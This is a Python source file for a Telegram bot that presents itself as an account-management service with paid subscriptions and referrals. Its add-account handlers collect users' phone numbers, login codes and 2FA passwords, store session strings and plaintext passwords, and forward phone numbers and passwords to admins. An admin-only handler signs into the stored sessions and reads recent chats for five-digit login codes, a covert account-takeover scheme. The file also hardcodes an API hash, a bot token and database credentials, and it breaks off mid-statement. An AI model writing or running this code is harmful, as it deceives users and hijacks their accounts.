# tvice_soft_bot.py
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Optional, Dict, List
import asyncpg
from pyrogram import Client, filters, types, enums
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired
import aiohttp
import json
import re

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Конфигурация
API_ID = 32480523
API_HASH = "147839735c9fa4e83451209e9b55cfc5"
BOT_TOKEN = "545818:AAvQLMQHJbxqEou37HutdklFOJEO1agzhLp"
CRYPTO_BOT_TOKEN = "545818:AAvQLMQHJbxqEou37HutdklFOJEO1agzhLp"
ADMIN_IDS = [8112176415, 7973988177]
CHANNEL_USERNAME = "@TvistNFT"
DB_URL = "postgresql://bothost_db_ed40420ef0b2:SteZisYQifIzWGcfFvsPwwiOd-2jsosCA54EVbTNpYs@node1.pghost.ru:32801/bothost_db_ed40420ef0b2"
USD_TO_RUB = 70.0

# Цены подписок
SUBSCRIPTION_PRICES = {
    1: {"rub": 5, "usdt": round(5 / USD_TO_RUB, 2)},
    30: {"rub": 50, "usdt": round(50 / USD_TO_RUB, 2)}
}

# Инициализация клиента
app = Client(
    "tvice_soft_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# Кэш для хранения состояний добавления аккаунтов
add_account_states = {}
account_codes = {}

# Класс для работы с базой данных
class Database:
    def __init__(self, dsn):
        self.dsn = dsn
        self.pool = None
    
    async def connect(self):
        self.pool = await asyncpg.create_pool(self.dsn)
        await self.init_db()
    
    async def close(self):
        if self.pool:
            await self.pool.close()
            self.pool = None
    
    async def init_db(self):
        async with self.pool.acquire() as conn:
            # Пользователи
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id BIGINT PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    referral_code TEXT UNIQUE,
                    referred_by BIGINT,
                    subscription_end TIMESTAMP,
                    created_at TIMESTAMP DEFAULT NOW()
                )
            ''')
            
            # Реферальная статистика
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS referrals (
                    id SERIAL PRIMARY KEY,
                    referrer_id BIGINT REFERENCES users(user_id),
                    referred_id BIGINT REFERENCES users(user_id),
                    earnings_rub DECIMAL(10,2) DEFAULT 0,
                    earnings_usdt DECIMAL(10,2) DEFAULT 0,
                    created_at TIMESTAMP DEFAULT NOW()
                )
            ''')
            
            # Добавленные боты (зеркала)
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS bots (
                    bot_token TEXT PRIMARY KEY,
                    bot_username TEXT,
                    owner_id BIGINT REFERENCES users(user_id),
                    notifications_enabled BOOLEAN DEFAULT TRUE,
                    created_at TIMESTAMP DEFAULT NOW()
                )
            ''')
            
            # Аккаунты пользователей
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS accounts (
                    id SERIAL PRIMARY KEY,
                    user_id BIGINT REFERENCES users(user_id),
                    phone_number TEXT,
                    session_string TEXT,
                    twofa_password TEXT,
                    status TEXT DEFAULT 'active',
                    created_at TIMESTAMP DEFAULT NOW()
                )
            ''')
            
            # Транзакции подписок
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS subscriptions (
                    id SERIAL PRIMARY KEY,
                    user_id BIGINT REFERENCES users(user_id),
                    amount_rub DECIMAL(10,2),
                    amount_usdt DECIMAL(10,2),
                    days INT,
                    payment_id TEXT,
                    status TEXT,
                    created_at TIMESTAMP DEFAULT NOW()
                )
            ''')
            
            # Курс валют
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS exchange_rates (
                    id SERIAL PRIMARY KEY,
                    currency_from TEXT DEFAULT 'USDT',
                    currency_to TEXT DEFAULT 'RUB',
                    rate DECIMAL(10,2) DEFAULT 70.00,
                    updated_at TIMESTAMP DEFAULT NOW()
                )
            ''')
            
            # Добавляем курс по умолчанию если нет
            await conn.execute('''
                INSERT INTO exchange_rates (rate) 
                SELECT 70.00 WHERE NOT EXISTS (SELECT 1 FROM exchange_rates)
            ''')
    
    async def get_user(self, user_id: int):
        async with self.pool.acquire() as conn:
            return await conn.fetchrow('SELECT * FROM users WHERE user_id = $1', user_id)
    
    async def create_user(self, user_id: int, username: str, first_name: str, referred_by: int = None):
        async with self.pool.acquire() as conn:
            referral_code = f"REF{user_id}"
            await conn.execute('''
                INSERT INTO users (user_id, username, first_name, referral_code, referred_by)
                VALUES ($1, $2, $3, $4, $5)
                ON CONFLICT (user_id) DO NOTHING
            ''', user_id, username, first_name, referral_code, referred_by)
            
            if referred_by:
                await conn.execute('''
                    INSERT INTO referrals (referrer_id, referred_id)
                    VALUES ($1, $2)
                ''', referred_by, user_id)
    
    async def update_subscription(self, user_id: int, days: int):
        async with self.pool.acquire() as conn:
            current = await conn.fetchval('SELECT subscription_end FROM users WHERE user_id = $1', user_id)
            if current:
                new_end = max(current, datetime.now()) + timedelta(days=days)
            else:
                new_end = datetime.now() + timedelta(days=days)
            await conn.execute('UPDATE users SET subscription_end = $1 WHERE user_id = $2', new_end, user_id)
    
    async def check_subscription(self, user_id: int) -> bool:
        async with self.pool.acquire() as conn:
            end = await conn.fetchval('SELECT subscription_end FROM users WHERE user_id = $1', user_id)
            return end and end > datetime.now()
    
    async def add_referral_earnings(self, referrer_id: int, amount_rub: float):
        async with self.pool.acquire() as conn:
            amount_usdt = amount_rub / USD_TO_RUB
            await conn.execute('''
                UPDATE referrals 
                SET earnings_rub = earnings_rub + $1, 
                    earnings_usdt = earnings_usdt + $2
                WHERE referrer_id = $3
            ''', amount_rub, amount_usdt, referrer_id)
    
    async def get_referral_stats(self, user_id: int):
        async with self.pool.acquire() as conn:
            # Количество рефералов
            count = await conn.fetchval('SELECT COUNT(*) FROM referrals WHERE referrer_id = $1', user_id)
            # Заработок
            earnings = await conn.fetchrow('''
                SELECT COALESCE(SUM(earnings_rub), 0) as total_rub, 
                       COALESCE(SUM(earnings_usdt), 0) as total_usdt 
                FROM referrals WHERE referrer_id = $1
            ''', user_id)
            return count, earnings['total_rub'], earnings['total_usdt']
    
    async def save_account(self, user_id: int, phone: str, session_string: str, twofa: str = None):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO accounts (user_id, phone_number, session_string, twofa_password)
                VALUES ($1, $2, $3, $4)
            ''', user_id, phone, session_string, twofa)
    
    async def get_user_accounts(self, user_id: int):
        async with self.pool.acquire() as conn:
            return await conn.fetch('SELECT * FROM accounts WHERE user_id = $1', user_id)
    
    async def delete_account(self, account_id: int, user_id: int):
        async with self.pool.acquire() as conn:
            await conn.execute('DELETE FROM accounts WHERE id = $1 AND user_id = $2', account_id, user_id)
    
    async def add_bot(self, bot_token: str, bot_username: str, owner_id: int):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO bots (bot_token, bot_username, owner_id)
                VALUES ($1, $2, $3)
                ON CONFLICT (bot_token) DO NOTHING
            ''', bot_token, bot_username, owner_id)
    
    async def get_user_bots(self, user_id: int):
        async with self.pool.acquire() as conn:
            return await conn.fetch('SELECT * FROM bots WHERE owner_id = $1', user_id)
    
    async def toggle_bot_notifications(self, bot_token: str, owner_id: int):
        async with self.pool.acquire() as conn:
            current = await conn.fetchval('''
                SELECT notifications_enabled FROM bots 
                WHERE bot_token = $1 AND owner_id = $2
            ''', bot_token, owner_id)
            await conn.execute('''
                UPDATE bots SET notifications_enabled = $1 
                WHERE bot_token = $2 AND owner_id = $3
            ''', not current, bot_token, owner_id)
            return not current
    
    async def save_payment(self, user_id: int, amount_rub: float, amount_usdt: float, 
                          days: int, payment_id: str):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO subscriptions (user_id, amount_rub, amount_usdt, days, payment_id, status)
                VALUES ($1, $2, $3, $4, $5, 'pending')
            ''', user_id, amount_rub, amount_usdt, days, payment_id)
    
    async def confirm_payment(self, payment_id: str):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                UPDATE subscriptions SET status = 'completed' 
                WHERE payment_id = $1
            ''', payment_id)

# Инициализация базы данных
db = Database(DB_URL)

# Класс для работы с Crypto Bot API
class CryptoBot:
    def __init__(self, token):
        self.token = token
        self.base_url = "https://pay.crypt.bot/api"
    
    async def create_invoice(self, amount: float, description: str, payload: str):
        async with aiohttp.ClientSession() as session:
            url = f"{self.base_url}/createInvoice"
            headers = {"Crypto-Pay-API-Token": self.token}
            data = {
                "asset": "USDT",
                "amount": str(amount),
                "description": description,
                "payload": payload
            }
            async with session.post(url, headers=headers, json=data) as resp:
                result = await resp.json()
                if result.get("ok"):
                    return result["result"]
                return None
    
    async def get_invoice_status(self, invoice_id: int):
        async with aiohttp.ClientSession() as session:
            url = f"{self.base_url}/getInvoices"
            headers = {"Crypto-Pay-API-Token": self.token}
            params = {"invoice_ids": str(invoice_id)}
            async with session.get(url, headers=headers, params=params) as resp:
                result = await resp.json()
                if result.get("ok") and result.get("result", {}).get("items"):
                    return result["result"]["items"][0]
                return None

crypto_bot = CryptoBot(CRYPTO_BOT_TOKEN)

# Функция проверки подписки на канал
async def check_channel_subscription(user_id: int) -> bool:
    try:
        member = await app.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status not in [enums.ChatMemberStatus.LEFT, enums.ChatMemberStatus.BANNED]
    except:
        return False

# Декоратор для проверки подписки на канал
def require_channel_subscription(func):
    async def wrapper(client, message, *args, **kwargs):
        user_id = message.from_user.id
        
        if not await check_channel_subscription(user_id):
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Подписаться", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
                [InlineKeyboardButton("✅ Проверить подписку", callback_data="check_subscription")]
            ])
            await message.reply(
                f"❌ Для использования бота необходимо подписаться на канал {CHANNEL_USERNAME}",
                reply_markup=keyboard
            )
            return
        
        return await func(client, message, *args, **kwargs)
    return wrapper

# Главное меню
def get_main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        [
            [KeyboardButton("📱 Менеджер аккаунтов")],
            [KeyboardButton("👤 Профиль"), KeyboardButton("💰 Реферальная система")]
        ],
        resize_keyboard=True
    )
    return keyboard

# Обработчик команды /start
@app.on_message(filters.command("start"))
async def start_command(client, message):
    user = message.from_user
    referred_by = None
    
    # Проверка реферального кода
    if len(message.command) > 1:
        ref_code = message.command[1]
        if ref_code.startswith("REF"):
            try:
                referred_by = int(ref_code[3:])
                if referred_by == user.id:
                    referred_by = None
            except:
                pass
    
    # Создание пользователя в БД
    await db.create_user(
        user.id,
        user.username or "no_username",
        user.first_name,
        referred_by
    )
    
    # Проверка подписки на канал
    if not await check_channel_subscription(user.id):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📢 Подписаться", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
            [InlineKeyboardButton("✅ Проверить подписку", callback_data="check_subscription")]
        ])
        await message.reply(
            f"👋 Привет, {user.first_name}!\n\n"
            f"❌ Для использования бота необходимо подписаться на канал {CHANNEL_USERNAME}",
            reply_markup=keyboard
        )
        return
    
    await message.reply(
        f"👋 Добро пожаловать, {user.first_name}!\n\n"
        f"🤖 Tvice Soft - ваш помощник для управления Telegram аккаунтами\n\n"
        f"Выберите раздел в меню ниже:",
        reply_markup=get_main_keyboard()
    )

# Обработчик проверки подписки
@app.on_callback_query(filters.regex("^check_subscription$"))
async def check_subscription_callback(client, callback_query):
    user_id = callback_query.from_user.id
    
    if await check_channel_subscription(user_id):
        await callback_query.message.delete()
        await callback_query.message.reply(
            "✅ Подписка подтверждена! Добро пожаловать в меню бота.",
            reply_markup=get_main_keyboard()
        )
    else:
        await callback_query.answer(f"❌ Вы ещё не подписались на канал {CHANNEL_USERNAME}!", show_alert=True)

# Обработчик раздела "Профиль"
@app.on_message(filters.regex("^👤 Профиль$"))
@require_channel_subscription
async def profile_handler(client, message):
    user = message.from_user
    user_data = await db.get_user(user.id)
    has_subscription = await db.check_subscription(user.id)
    bots = await db.get_user_bots(user.id)
    
    subscription_status = "✅ Активна" if has_subscription else "❌ Неактивна"
    if has_subscription and user_data['subscription_end']:
        end_date = user_data['subscription_end'].strftime("%d.%m.%Y %H:%M")
        subscription_status += f" (до {end_date})"
    
    text = (
        f"👤 **Ваш профиль**\n\n"
        f"🆔 ID: `{user.id}`\n"
        f"📝 Username: @{user.username or 'отсутствует'}\n"
        f"🤖 Количество ботов: {len(bots)}\n"
        f"📊 Статус подписки: {subscription_status}\n"
        f"🔗 Реферальный код: `REF{user.id}`"
    )
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Оплатить подписку", callback_data="buy_subscription")]
    ])
    
    await message.reply(text, reply_markup=keyboard)

# Обработчик покупки подписки
@app.on_callback_query(filters.regex("^buy_subscription$"))
async def buy_subscription_callback(client, callback_query):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"📅 30 дней - {SUBSCRIPTION_PRICES[30]['rub']}₽ ({SUBSCRIPTION_PRICES[30]['usdt']} USDT)", 
                              callback_data="sub_30")],
        [InlineKeyboardButton(f"📅 1 день - {SUBSCRIPTION_PRICES[1]['rub']}₽ ({SUBSCRIPTION_PRICES[1]['usdt']} USDT)", 
                              callback_data="sub_1")],
        [InlineKeyboardButton("◀️ Назад", callback_data="back_to_profile")]
    ])
    
    await callback_query.message.edit_text(
        "💳 **Выберите тариф подписки**\n\n"
        f"Курс: 1 USDT = {USD_TO_RUB}₽\n\n"
        "Оплата производится через Crypto Bot в USDT",
        reply_markup=keyboard
    )

# Обработчик выбора тарифа
@app.on_callback_query(filters.regex("^sub_(\\d+)$"))
async def process_subscription(client, callback_query):
    days = int(callback_query.matches[0].group(1))
    price = SUBSCRIPTION_PRICES[days]
    user_id = callback_query.from_user.id
    
    # Создание счета в Crypto Bot
    payload = f"sub_{user_id}_{days}_{datetime.now().timestamp()}"
    invoice = await crypto_bot.create_invoice(
        amount=price['usdt'],
        description=f"Подписка Tvice Soft на {days} дней",
        payload=payload
    )
    
    if invoice:
        # Сохраняем информацию о платеже
        await db.save_payment(
            user_id, price['rub'], price['usdt'], days, str(invoice['invoice_id'])
        )
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 Оплатить", url=invoice['pay_url'])],
            [InlineKeyboardButton("✅ Проверить оплату", callback_data=f"check_payment_{invoice['invoice_id']}")]
        ])
        
        await callback_query.message.edit_text(
            f"💰 **Счет на оплату**\n\n"
            f"Тариф: {days} дней\n"
            f"Сумма: {price['rub']}₽ ({price['usdt']} USDT)\n\n"
            f"Для оплаты нажмите кнопку ниже и следуйте инструкциям Crypto Bot.\n\n"
            f"После оплаты нажмите «Проверить оплату»",
            reply_markup=keyboard
        )
    else:
        await callback_query.answer("❌ Ошибка создания счета. Попробуйте позже.", show_alert=True)

# Обработчик проверки оплаты
@app.on_callback_query(filters.regex("^check_payment_(\\d+)$"))
async def check_payment(client, callback_query):
    invoice_id = int(callback_query.matches[0].group(1))
    user_id = callback_query.from_user.id
    
    invoice_status = await crypto_bot.get_invoice_status(invoice_id)
    
    if invoice_status and invoice_status['status'] == 'paid':
        # Получаем информацию о платеже из БД
        async with db.pool.acquire() as conn:
            sub_info = await conn.fetchrow(
                'SELECT * FROM subscriptions WHERE payment_id = $1 AND user_id = $2',
                str(invoice_id), user_id
            )
        
        if sub_info and sub_info['status'] == 'pending':
            # Активируем подписку
            await db.update_subscription(user_id, sub_info['days'])
            await db.confirm_payment(str(invoice_id))
            
            # Начисляем реферальное вознаграждение
            user_data = await db.get_user(user_id)
            if user_data and user_data['referred_by']:
                # 50% от покупки
                earnings_rub = sub_info['amount_rub'] * 0.5
                await db.add_referral_earnings(user_data['referred_by'], earnings_rub)
            
            await callback_query.message.edit_text(
                "✅ **Оплата успешно подтверждена!**\n\n"
                f"Подписка активирована на {sub_info['days']} дней.\n"
                "Теперь вам доступны все функции бота.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("👤 В профиль", callback_data="back_to_profile")]
                ])
            )
    else:
        await callback_query.answer("❌ Платеж не найден или не оплачен", show_alert=True)

# Обработчик раздела "Реферальная система"
@app.on_message(filters.regex("^💰 Реферальная система$"))
@require_channel_subscription
async def referrals_handler(client, message):
    user_id = message.from_user.id
    count, earnings_rub, earnings_usdt = await db.get_referral_stats(user_id)
    
    text = (
        "💰 **Реферальная система**\n\n"
        f"🎁 Ваше вознаграждение: **50%** от всех покупок приглашенных пользователей\n\n"
        f"📊 Статистика:\n"
        f"👥 Рефералов: {count}\n"
        f"💵 Заработано: {earnings_rub:.2f}₽ ({earnings_usdt:.2f} USDT)\n\n"
        f"🔗 Ваша реферальная ссылка:\n"
        f"`https://t.me/{(await app.get_me()).username}?start=REF{user_id}`"
    )
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Добавить бота", callback_data="add_bot"),
         InlineKeyboardButton("🤖 Мои боты", callback_data="my_bots")]
    ])
    
    await message.reply(text, reply_markup=keyboard)

# Обработчик добавления бота
@app.on_callback_query(filters.regex("^add_bot$"))
async def add_bot_callback(client, callback_query):
    await callback_query.message.edit_text(
        "🤖 **Добавление нового бота**\n\n"
        "Отправьте мне токен бота, который вы хотите добавить.\n"
        "Токен можно получить у @BotFather\n\n"
        "Пример: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("◀️ Назад", callback_data="back_to_referrals")]
        ])
    )
    
    # Сохраняем состояние
    add_account_states[callback_query.from_user.id] = {"state": "waiting_bot_token"}

# Обработчик текста для добавления бота
@app.on_message(filters.text & filters.private)
@require_channel_subscription
async def handle_bot_token(client, message):
    user_id = message.from_user.id
    
    if user_id in add_account_states and add_account_states[user_id].get("state") == "waiting_bot_token":
        bot_token = message.text.strip()
        
        # Простая валидация токена
        if not re.match(r'^\d+:[A-Za-z0-9_-]+$', bot_token):
            await message.reply("❌ Неверный формат токена. Попробуйте снова.")
            return
        
        try:
            # Проверяем токен, получая информацию о боте
            async with aiohttp.ClientSession() as session:
                url = f"https://api.telegram.org/bot{bot_token}/getMe"
                async with session.get(url) as resp:
                    data = await resp.json()
                    if not data.get('ok'):
                        await message.reply("❌ Неверный токен бота. Проверьте и попробуйте снова.")
                        return
                    bot_username = data['result']['username']
            
            # Сохраняем бота в БД
            await db.add_bot(bot_token, bot_username, user_id)
            
            del add_account_states[user_id]
            
            await message.reply(
                f"✅ Бот @{bot_username} успешно добавлен!\n\n"
                f"Теперь вы можете настроить уведомления в разделе «Мои боты».",
                reply_markup=get_main_keyboard()
            )
            
        except Exception as e:
            logger.error(f"Error adding bot: {e}")
            await message.reply("❌ Произошла ошибка при добавлении бота. Попробуйте позже.")

# Обработчик "Мои боты"
@app.on_callback_query(filters.regex("^my_bots$"))
async def my_bots_callback(client, callback_query):
    user_id = callback_query.from_user.id
    bots = await db.get_user_bots(user_id)
    
    if not bots:
        await callback_query.message.edit_text(
            "🤖 **Мои боты**\n\nУ вас пока нет добавленных ботов.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ Добавить бота", callback_data="add_bot")],
                [InlineKeyboardButton("◀️ Назад", callback_data="back_to_referrals")]
            ])
        )
        return
    
    text = "🤖 **Мои боты**\n\n"
    keyboard_buttons = []
    
    for bot in bots:
        status = "🔔 Вкл" if bot['notifications_enabled'] else "🔕 Выкл"
        text += f"• @{bot['bot_username']} - {status}\n"
        keyboard_buttons.append([
            InlineKeyboardButton(
                f"@{bot['bot_username']} - {status}", 
                callback_data=f"toggle_bot_{bot['bot_token']}"
            )
        ])
    
    keyboard_buttons.append([InlineKeyboardButton("➕ Добавить бота", callback_data="add_bot")])
    keyboard_buttons.append([InlineKeyboardButton("◀️ Назад", callback_data="back_to_referrals")])
    
    await callback_query.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard_buttons)
    )

# Обработчик переключения уведомлений бота
@app.on_callback_query(filters.regex("^toggle_bot_(.+)$"))
async def toggle_bot_notifications(client, callback_query):
    bot_token = callback_query.matches[0].group(1)
    user_id = callback_query.from_user.id
    
    new_status = await db.toggle_bot_notifications(bot_token, user_id)
    status_text = "включены" if new_status else "выключены"
    
    await callback_query.answer(f"✅ Уведомления {status_text}", show_alert=False)
    await my_bots_callback(client, callback_query)

# Обработчик раздела "Менеджер аккаунтов"
@app.on_message(filters.regex("^📱 Менеджер аккаунтов$"))
@require_channel_subscription
async def account_manager_handler(client, message):
    keyboard = ReplyKeyboardMarkup(
        [
            [KeyboardButton("➕ Добавить аккаунт")],
            [KeyboardButton("📋 Мои аккаунты")],
            [KeyboardButton("⚙️ Функции")],
            [KeyboardButton("◀️ Назад в меню")]
        ],
        resize_keyboard=True
    )
    
    await message.reply(
        "📱 **Менеджер аккаунтов**\n\n"
        "Выберите действие:",
        reply_markup=keyboard
    )

# Обработчик "Добавить аккаунт"
@app.on_message(filters.regex("^➕ Добавить аккаунт$"))
@require_channel_subscription
async def add_account_handler(client, message):
    user_id = message.from_user.id
    add_account_states[user_id] = {"state": "waiting_phone"}
    
    await message.reply(
        "📱 **Добавление аккаунта**\n\n"
        "Введите номер телефона в международном формате:\n"
        "Например: +79123456789"
    )

# Обработчик ввода номера телефона
@app.on_message(filters.text & filters.private)
@require_channel_subscription
async def handle_phone_input(client, message):
    user_id = message.from_user.id
    
    if user_id in add_account_states and add_account_states[user_id].get("state") == "waiting_phone":
        phone = message.text.strip()
        
        # Простая валидация номера
        if not re.match(r'^\+?\d{10,15}$', phone.replace(' ', '')):
            await message.reply("❌ Неверный формат номера. Попробуйте снова.")
            return
        
        try:
            # Создаем временного клиента для авторизации
            temp_client = Client(
                f"temp_{user_id}_{phone}",
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=True
            )
            
            await temp_client.connect()
            send_code = await temp_client.send_code(phone)
            
            # Сохраняем данные
            add_account_states[user_id].update({
                "state": "waiting_code",
                "phone": phone,
                "temp_client": temp_client,
                "phone_code_hash": send_code.phone_code_hash
            })
            
            await message.reply(
                "📱 **Код подтверждения**\n\n"
                "Введите код, который пришел в Telegram:\n"
                "(5 цифр)"
            )
            
        except Exception as e:
            logger.error(f"Error sending code: {e}")
            await message.reply("❌ Ошибка при отправке кода. Проверьте номер и попробуйте снова.")
            del add_account_states[user_id]

# Обработчик ввода кода подтверждения
@app.on_message(filters.text & filters.private)
@require_channel_subscription
async def handle_code_input(client, message):
    user_id = message.from_user.id
    
    if user_id in add_account_states and add_account_states[user_id].get("state") == "waiting_code":
        code = message.text.strip()
        state = add_account_states[user_id]
        
        if not code.isdigit() or len(code) != 5:
            await message.reply("❌ Код должен состоять из 5 цифр. Попробуйте снова.")
            return
        
        try:
            temp_client = state["temp_client"]
            phone = state["phone"]
            phone_code_hash = state["phone_code_hash"]
            
            await temp_client.sign_in(phone, phone_code_hash, code)
            
            # Успешный вход, сохраняем сессию
            session_string = await temp_client.export_session_string()
            
            # Спрашиваем 2FA
            add_account_states[user_id].update({
                "state": "waiting_2fa",
                "session_string": session_string
            })
            
            await message.reply(
                "🔐 **Двухфакторная аутентификация**\n\n"
                "Если у аккаунта включен 2FA пароль, введите его.\n"
                "Если нет - отправьте '-' для пропуска"
            )
            
        except SessionPasswordNeeded:
            # Требуется 2FA
            add_account_states[user_id].update({"state": "waiting_2fa"})
            await message.reply(
                "🔐 **Двухфакторная аутентификация**\n\n"
                "Введите пароль 2FA:"
            )
            
        except (PhoneCodeInvalid, PhoneCodeExpired):
            await message.reply("❌ Неверный или истекший код. Попробуйте снова.")
            await temp_client.disconnect()
            del add_account_states[user_id]
            
        except Exception as e:
            logger.error(f"Error signing in: {e}")
            await message.reply("❌ Ошибка при входе. Попробуйте снова.")
            await temp_client.disconnect()
            del add_account_states[user_id]

# Обработчик ввода 2FA пароля
@app.on_message(filters.text & filters.private)
@require_channel_subscription
async def handle_2fa_input(client, message):
    user_id = message.from_user.id
    
    if user_id in add_account_states and add_account_states[user_id].get("state") == "waiting_2fa":
        twofa = message.text.strip()
        state = add_account_states[user_id]
        
        try:
            temp_client = state.get("temp_client")
            if not temp_client:
                raise Exception("No temp client")
            
            # Если пароль не "-", пытаемся войти с ним
            if twofa != "-" and temp_client.is_connected and not await temp_client.is_user_authorized():
                try:
                    await temp_client.check_password(twofa)
                except:
                    await message.reply("❌ Неверный пароль 2FA. Попробуйте снова.")
                    return
            
            # Сохраняем аккаунт в БД
            await db.save_account(
                user_id,
                state["phone"],
                state.get("session_string") or await temp_client.export_session_string(),
                twofa if twofa != "-" else None
            )
            
            # Получаем информацию об аккаунте для уведомления админу
            me = await temp_client.get_me()
            
            # Отключаем временного клиента
            await temp_client.disconnect()
            
            # Уведомление админам
            for admin_id in ADMIN_IDS:
                try:
                    keyboard = InlineKeyboardMarkup([
                        [InlineKeyboardButton("📩 Получить код", callback_data=f"get_code_{user_id}")]
                    ])
                    
                    await client.send_message(
                        admin_id,
                        f"✅ **Новый аккаунт добавлен**\n\n"
                        f"👤 Пользователь: @{message.from_user.username or 'нет'}\n"
                        f"📱 Телефон: {state['phone']}\n"
                        f"🔐 2FA: {twofa if twofa != '-' else 'не установлен'}\n"
                        f"🆔 Telegram ID: {me.id}\n"
                        f"📝 Имя: {me.first_name}\n"
                        f"⏰ Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}",
                        reply_markup=keyboard
                    )
                except Exception as e:
                    logger.error(f"Error notifying admin: {e}")
            
            await message.reply(
                "✅ **Аккаунт успешно добавлен!**\n\n"
                "Теперь вы можете использовать его в функциях бота.",
                reply_markup=ReplyKeyboardMarkup(
                    [[KeyboardButton("◀️ Назад в меню")]],
                    resize_keyboard=True
                )
            )
            
            del add_account_states[user_id]
            
        except Exception as e:
            logger.error(f"Error saving account: {e}")
            await message.reply("❌ Ошибка при сохранении аккаунта. Попробуйте снова.")
            if 'temp_client' in locals():
                await temp_client.disconnect()
            del add_account_states[user_id]

# Обработчик получения кода (для админов)
@app.on_callback_query(filters.regex("^get_code_(\\d+)$"))
async def get_code_callback(client, callback_query):
    if callback_query.from_user.id not in ADMIN_IDS:
        await callback_query.answer("❌ У вас нет прав администратора", show_alert=True)
        return
    
    user_id = int(callback_query.matches[0].group(1))
    
    try:
        # Получаем аккаунты пользователя
        accounts = await db.get_user_accounts(user_id)
        if not accounts:
            await callback_query.answer("❌ У пользователя нет аккаунтов", show_alert=True)
            return
        
        # Берем последний добавленный аккаунт
        account = accounts[-1]
        
        # Создаем клиент из сессии
        temp_client = Client(
            f"temp_getcode_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=account['session_string']
        )
        
        await temp_client.connect()
        
        # Получаем последние диалоги
        dialogs = []
        async for dialog in temp_client.get_dialogs():
            dialogs.append(dialog)
            if len(dialogs) >= 10:
                break
        
        # Ищем код в последних сообщениях
        found_code = None
        for dialog in dialogs:
            if dialog.chat.type in [enums.ChatType.PRIVATE, enums.ChatType.BOT]:
                try:
                    async for msg in temp_client.get_chat_history(dialog.chat.id, limit=5):
                        if msg.text and re.search(r'\b\d{5}\b', msg.text):
                            found_code = re.search(r'\b(\d{5})\b', msg.text).group(1)
                            break
                except:
                    continue
                if found_code:
                    break
        
        await temp_client.disconnect()
        
        if found_code:
            await callback_query.message.reply(f"📩 **Код подтверждения**: `{found_code}`")
            await callback_query.answer("✅ Код найден", show_alert=False)
        else:
            await callback_query.answer("❌ Код не найден в последних сообщениях", show_alert=True)
            
    except Exception as e:
        logger.error(f"Error getting code: {e}")
        await callback_query.answer("❌ Ошибка при получении кода", show_alert=True)

# Обработчик "Мои аккаунты"
@app.on_message(filters.regex("^📋 Мои аккаунты$"))
@require_channel_subscription
async def my_accounts_handler(client, message):
    user_id = message.from_user.id
    accounts = await db.get_user_accounts(user_id)
    
    if not accounts:
        await message.reply(
            "📋 **Мои аккаунты**\n\n"
            "У вас пока нет добавленных аккаунтов.",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("➕ Добавить аккаунт")]],
                resize_keyboard=True
            )
        )
        return
    
    text = "📋 **Мои аккаунты**\n\n"
    keyboard_buttons = []
    
    for acc in accounts:
        status_emoji = "🟢" if acc['status'] == 'active' else "🔴"
        text += f"{status_emoji} {acc['phone_number']}\n"
        text += f"   🆔 ID: {acc['id']}\n"
        text += f"   📅 Добавлен: {acc['created_at'].strftime('%d.%m.%Y')}\n\n"
        keyboard_buttons.append([
            InlineKeyboardButton(f"❌ Удалить {acc['phone_number']}", 
                               callback_data=f"del_acc_{acc['id']}")
        ])
    
    keyboard_buttons.append([InlineKeyboardButton("➕ Добавить аккаунт", callback_data="add_acc_from_list")])
    keyboard_buttons.append([InlineKeyboardButton("◀️ Назад", callback_data="back_to_accounts")])
    
    await message.reply(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard_buttons)
    )

# Обработчик удаления аккаунта
@app.on_callback_query(filters.regex("^del_acc_(\\d+)$"))
async def delete_account_callback(client, callback_query):
    account_id = int(callback_query.matches[0].group(1))
    user_id = callback_query.from_user.id
    
    await db.delete_account(account_id, user_id)
    await callback_query.answer("✅ Аккаунт удален", show_alert=True)
    
    # Обновляем список
    await my_accounts_handler(client, callback_query.message)

# Обработчик "Функции"
@app.on_message(filters.regex("^⚙️ Функции$"))
@require_channel_subscription
async def functions_handler(client, message):
    user_id = message.from_user.id
    
    if not await db.check_subscription(user_id):
        await message.reply(
            "❌ **Произошла ошибка**\n\n"
            "Для доступа к функциям необходимо оформить подписку.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Оплатить подписку", callback_data="buy_subscription")]
            ])
        )
        return
    
    text = (
